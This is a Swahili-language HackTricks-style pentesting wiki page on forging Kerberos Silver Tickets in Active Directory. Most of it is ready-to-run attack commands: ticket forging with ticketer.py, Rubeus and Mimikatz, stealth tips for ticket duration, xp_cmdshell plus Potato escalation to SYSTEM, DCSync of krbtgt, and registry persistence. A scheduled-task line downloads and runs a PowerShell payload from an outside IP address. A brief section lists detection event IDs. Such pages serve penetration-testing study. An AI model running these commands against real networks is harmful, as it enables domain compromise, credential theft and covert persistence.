# Silver Ticket

{{#include ../../banners/hacktricks-training.md}}



## Silver ticket

Mashambulizi ya **Silver Ticket** yanahusisha kutumia vibaya service tickets katika mazingira ya Active Directory (AD). Mbinu hii hutegemea **kupata NTLM hash ya service account**, kama vile computer account, ili kutengeneza Ticket Granting Service (TGS) ticket. Kwa ticket hii iliyotengenezwa, mshambuliaji anaweza kufikia services mahususi kwenye mtandao, **akijifanya mtumiaji yeyote**, kwa kawaida akilenga kupata privileges za kiutawala. Inasisitizwa kuwa kutumia AES keys kutengeneza tickets ni salama zaidi na ni vigumu zaidi kugunduliwa.<sup>[[1]](#references)[[2]](#references)</sup>

> [!WARNING]
> Silver Tickets ni vigumu zaidi kugunduliwa kuliko Golden Tickets kwa sababu zinahitaji tu **hash ya service account**, wala si account ya krbtgt. Hata hivyo, zina kikomo cha service mahususi inayolengwa. Zaidi ya hayo, kuiba tu password ya mtumiaji.
Zaidi ya hayo, ukidhibiti **password ya account iliyo na SPN**, unaweza kutumia password hiyo kuunda Silver Ticket inayojifanya mtumiaji yeyote kwenye service hiyo.

### Mabadiliko ya kisasa ya Kerberos (domains za AES-only)

- Windows updates zinazoanzia **8 Nov 2022 (KB5021131)** huweka service tickets kutumia **AES session keys** kwa default inapowezekana na zinaendelea kuondoa RC4. Inatarajiwa kuwa DCs zitasambazwa zikiwa na RC4 **imezimwa kwa default kufikia katikati ya 2026**, hivyo kutegemea NTLM/RC4 hashes kwa Silver Tickets kunazidi kushindikana kwa `KRB_AP_ERR_MODIFIED`. Daima toa **AES keys** (`aes256-cts-hmac-sha1-96` / `aes128-cts-hmac-sha1-96`) za target service account.<sup>[[5]](#references)</sup>
- Ikiwa `msDS-SupportedEncryptionTypes` ya service account imewekewa AES pekee, lazima utengeneze ticket kwa `/aes256` au `-aesKey`; RC4 (`/rc4` au `-nthash`) haitafanya kazi hata kama una NTLM hash.<sup>[[6]](#references)</sup>
- gMSA/computer accounts hubadilisha keys kila baada ya siku 30; dump **AES key ya sasa** kutoka LSASS, Secretsdump/NTDS, au DCsync kabla ya kutengeneza ticket.
- OPSEC: muda wa kawaida wa ticket katika tools mara nyingi ni **miaka 10**; weka muda halisi (kwa mfano, `-duration 600` minutes) ili kuepuka kugunduliwa kutokana na muda usio wa kawaida wa ticket.<sup>[[6]](#references)</sup>

Kwa ajili ya kutengeneza tickets, tools tofauti hutumika kulingana na operating system:

### Kwenye Linux
```bash
# Forge with AES instead of RC4 (supports gMSA/machine accounts)
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn <SERVICE_PRINCIPAL_NAME> <USER>
# or read key directly from a keytab (useful when only keytab is obtained)
python ticketer.py -keytab service.keytab -spn <SPN> -domain <DOMAIN> -domain-sid <DOMAIN_SID> <USER>

# shorten validity for stealth
python ticketer.py -aesKey <AES256_HEX> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn cifs/<HOST_FQDN> -duration 480 <USER>

export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
```
### Kwenye Windows
```bash
# Using Rubeus to request a service ticket and inject (works when you already have a TGT)
# /ldap option is used to get domain data automatically
rubeus.exe asktgs /user:<USER> [/aes256:<HASH> /aes128:<HASH> /rc4:<HASH>] \
/domain:<DOMAIN> /ldap /service:cifs/<TARGET_FQDN> /ptt /nowrap /printcmd

# Forging the ticket directly with Mimikatz (silver ticket => /service + /target)
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/aes256:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"
# RC4 still works only if the DC and service accept RC4
mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> \
/rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET> /ptt"

# Inject an already forged kirbi
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>

# Obtain a shell
.\PsExec.exe -accepteula \\<TARGET> cmd
```
Huduma ya CIFS imeangaziwa kama target ya kawaida ya kufikia mfumo wa faili wa mwathiriwa, lakini huduma nyingine kama HOST na RPCSS pia zinaweza kutumiwa kwa tasks na WMI queries.

### Mfano: MSSQL service (MSSQLSvc) + Potato to SYSTEM

Ikiwa una NTLM hash (au AES key) ya akaunti ya SQL service (kwa mfano, sqlsvc), unaweza kutengeneza TGS kwa MSSQL SPN na kuiga utambulisho wa mtumiaji yeyote kwa SQL service. Kutoka hapo, wezesha xp_cmdshell ili kutekeleza commands kama akaunti ya SQL service. Ikiwa token hiyo ina SeImpersonatePrivilege, tumia Potato kwa mfululizo ili kupata SYSTEM.<sup>[[4]](#references)</sup>
```bash
# Forge a silver ticket for MSSQLSvc (AES example)
python ticketer.py -aesKey <SQLSVC_AES256> -domain-sid <DOMAIN_SID> -domain <DOMAIN> \
-spn MSSQLSvc/<host.fqdn>:1433 administrator
export KRB5CCNAME=$PWD/administrator.ccache

# Connect to SQL using Kerberos and run commands via xp_cmdshell
impacket-mssqlclient -k -no-pass <DOMAIN>/administrator@<host.fqdn>:1433 \
-q "EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;EXEC xp_cmdshell 'whoami'"
```
- Ikiwa context inayopatikana ina SeImpersonatePrivilege (mara nyingi huwa hivyo kwa service accounts), tumia Potato variant kupata SYSTEM:
```bash
# On the target host (via xp_cmdshell or interactive), run e.g. PrintSpoofer/GodPotato
PrintSpoofer.exe -c "cmd /c whoami"
# or
GodPotato -cmd "cmd /c whoami"
```
Maelezo zaidi kuhusu kutumia vibaya MSSQL na kuwezesha xp_cmdshell:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

Muhtasari wa Potato techniques:

{{#ref}}
../windows-local-privilege-escalation/roguepotato-and-printspoofer.md
{{#endref}}

## Available Services

| Aina ya Service                            | Silver Tickets za Service                                                   |
| ------------------------------------------ | -------------------------------------------------------------------------- |
| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Kulingana na OS pia:</p><p>WSMAN</p><p>RPCSS</p> |
| WinRM                                      | <p>HOST</p><p>HTTP</p><p>Katika baadhi ya hali unaweza kuomba tu: WINRM</p> |
| Scheduled Tasks                            | HOST                                                                       |
| Windows File Share, pia psexec             | CIFS                                                                       |
| LDAP operations, ikijumuisha DCSync        | LDAP                                                                       |
| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
| Golden Tickets                             | krbtgt                                                                     |

Kwa kutumia **Rubeus** unaweza **kuomba tickets zote** hizi ukitumia parameter:

- `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`

### Silver tickets Event IDs

- 4624: Kuingia kwa akaunti
- 4634: Kutoka kwa akaunti
- 4672: Kuingia kwa Admin
- **Kutokuwepo kwa 4768/4769 inayotangulia kwenye DC** kwa client/service hiyo hiyo ni kiashiria cha kawaida cha TGS iliyoghushiwa kuwasilishwa moja kwa moja kwa service.
- Muda wa ticket kuwa mrefu isivyo kawaida au aina ya encryption isiyotarajiwa (RC4 wakati domain inalazimisha AES) pia hujitokeza katika data ya 4769/4624.

## Persistence

Ili kuzuia mashine kubadilisha password yake kila baada ya siku 30, weka  `HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\DisablePasswordChange = 1` au unaweza kuweka `HKLM\SYSTEM\CurrentControlSet\Services\NetLogon\Parameters\MaximumPasswordAge` kuwa thamani kubwa kuliko 30days ili kuonyesha kipindi cha mzunguko ambacho password ya mashine inapaswa kubadilishwa.<sup>[[3]](#references)</sup>

## Kutumia vibaya Service tickets

Katika mifano ifuatayo, hebu tufikirie kwamba ticket ilipatikana kwa kujifanya kuwa akaunti ya administrator.

### CIFS

Ukitumia ticket hii utaweza kufikia folda za `C$` na `ADMIN$` kupitia **SMB** (ikiwa zimewekwa wazi) na kunakili files kwenye sehemu ya filesystem ya mbali kwa kufanya tu kitu kama:
```bash
dir \\vulnerable.computer\C$
dir \\vulnerable.computer\ADMIN$
copy afile.txt \\vulnerable.computer\C$\Windows\Temp
```
Utaweza pia kupata shell ndani ya host au kutekeleza arbitrary commands ukitumia **psexec**:


{{#ref}}
../lateral-movement/psexec-and-winexec.md
{{#endref}}

### HOST

Kwa ruhusa hii unaweza kuunda scheduled tasks kwenye kompyuta za mbali na kutekeleza amri kiholela:
```bash
#Check you have permissions to use schtasks over a remote server
schtasks /S some.vuln.pc
#Create scheduled task, first for exe execution, second for powershell reverse shell download
schtasks /create /S some.vuln.pc /SC weekly /RU "NT Authority\System" /TN "SomeTaskName" /TR "C:\path\to\executable.exe"
schtasks /create /S some.vuln.pc /SC Weekly /RU "NT Authority\SYSTEM" /TN "SomeTaskName" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.114:8080/pc.ps1''')'"
#Check it was successfully created
schtasks /query /S some.vuln.pc
#Run created schtask now
schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
```
### HOST + RPCSS

Kwa tickets hizi unaweza **kutekeleza WMI kwenye mfumo wa mwathiriwa**:
```bash
#Check you have enough privileges
Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
#Execute code
Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlist "$RunCommand"

#You can also use wmic
wmic remote.computer.local list full /format:list
```
Pata **maelezo zaidi kuhusu wmiexec** kwenye ukurasa ufuatao:


{{#ref}}
../lateral-movement/wmiexec.md
{{#endref}}

### HOST + WSMAN (WINRM)

Ukiwa na access ya winrm kwenye computer, unaweza **kuifikia** na hata kupata PowerShell:
```bash
New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
```
Angalia ukurasa ufuatao ili kujifunza **njia zaidi za kuunganishwa na host ya mbali kwa kutumia winrm**:


{{#ref}}
../lateral-movement/winrm.md
{{#endref}}

> [!WARNING]
> Kumbuka kwamba **winrm lazima iwe imewashwa na iwe inasikiliza** kwenye kompyuta ya mbali ili kuifikia.

### LDAP

Kwa privilege hii unaweza kudump database ya DC kwa kutumia **DCSync**:
```
mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
```
**Jifunze zaidi kuhusu DCSync** kwenye ukurasa ufuatao:


{{#ref}}
dcsync.md
{{#endref}}


## Marejeo

- [1] [Kerberos: Silver Tickets - ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
- [2] [Kerberos (II): Jinsi ya kushambulia Kerberos? - Tarlogic](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [3] [Mchakato wa Password ya Machine Account - Microsoft Tech Community](https://techcommunity.microsoft.com/blog/askds/machine-account-password-process/396027)
- [4] [HTB Sendai – 0xdf: Silver Ticket + Potato path](https://0xdf.gitlab.io/2025/08/28/htb-sendai.html)
- [5] [KB5021131 Kerberos hardening & RC4 deprecation](https://support.microsoft.com/en-us/topic/kb5021131-how-to-manage-the-kerberos-protocol-changes-related-to-cve-2022-37966-fd837ac3-cdec-4e76-a6ec-86e67501407d)
- [6] [Impacket ticketer.py current options (AES/keytab/duration)](https://kb.offsec.nl/tools/framework/impacket/ticketer-py/)

{{#include ../../banners/hacktricks-training.md}}
